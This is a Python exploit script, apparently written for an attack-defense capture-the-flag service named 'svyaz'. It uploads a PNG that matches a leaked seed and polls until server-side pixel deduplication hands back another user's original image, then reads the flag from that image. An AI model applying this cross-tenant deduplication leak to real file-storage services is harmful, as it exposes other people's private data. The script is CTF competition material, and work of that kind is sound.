#!/usr/bin/env python3
"""Recover flags from pixel-deduplicated PNG originals."""

import sys
import time

from svyaz_common import Client, fresh_id, invitations, matching_png, png_flag, public_room


def exploit(ip, invite):
    guest = Client(ip).register()
    guild_id = guest.join(invite)["guild_id"]
    room = public_room(guest.channels(guild_id))
    seeds = [
        item.get("content", "").split("Visual preset: ", 1)[1].strip()
        for item in guest.messages(room)
        if item.get("content", "").startswith("Visual preset: ")
    ]
    if not seeds:
        return []

    own_guild = guest.api("POST", "/guilds", {"name": "Image workspace"},
                          expected=201, headers={"Idempotency-Key": fresh_id()})["id"]
    own_room = public_room(guest.channels(own_guild))
    flags = []
    for seed in seeds:
        own_image = matching_png(seed)
        upload_id = guest.upload(own_room, own_image)
        guest.api("POST", f"/channels/{own_room}/messages", {
            "client_id": fresh_id(),
            "content": "Image preview", "mentions": [], "upload_ids": [upload_id],
        }, expected=201)
        # Алиас сначала отдаёт свой оригинал; фоновая уборка переводит его на
        # общий объект. OCR нужен только после фактической смены байтов.
        deadline = time.monotonic() + 10
        while time.monotonic() < deadline:
            image = guest.attachment(own_room, upload_id)
            if image != own_image:
                flag = png_flag(image, seed)
                if flag:
                    flags.append(flag)
                    break
            time.sleep(0.35)
    return flags


def main(ip):
    seen = set()
    for invite in invitations(ip):
        try:
            for flag in exploit(ip, invite):
                if flag not in seen:
                    seen.add(flag)
                    print(flag, flush=True)
        except Exception as exc:
            print(f"media {invite[:8]}: {exc}", file=sys.stderr)


if __name__ == "__main__":
    main(sys.argv[1])
